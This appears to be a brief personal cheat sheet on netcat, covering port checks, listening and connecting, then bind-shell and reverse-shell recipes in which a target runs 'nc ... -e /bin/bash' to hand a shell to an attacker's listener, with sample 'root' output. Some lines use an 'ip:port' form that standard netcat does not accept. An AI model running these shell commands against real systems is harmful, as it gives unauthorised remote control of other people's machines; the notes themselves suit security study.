# Netcat

- Check
nc -v 192.168.1.1:80 (verbose)

- listen
nc -lvp 1234(listen,verbose,port)
no ip means any(0.0.0.0)

- connect
nc 192.168.1.1:1234

## Shell

- Listen
nc -lvp 1234 -e /bin/bash (execute)

- Connect
nc 192.168.1.1 1234

```shell
whoami
root```

### Reverse
- Listen(client)
nc -lvp 1234
- connect(attacked)
nc 192.168.23.54 1234 -e /bin/bash


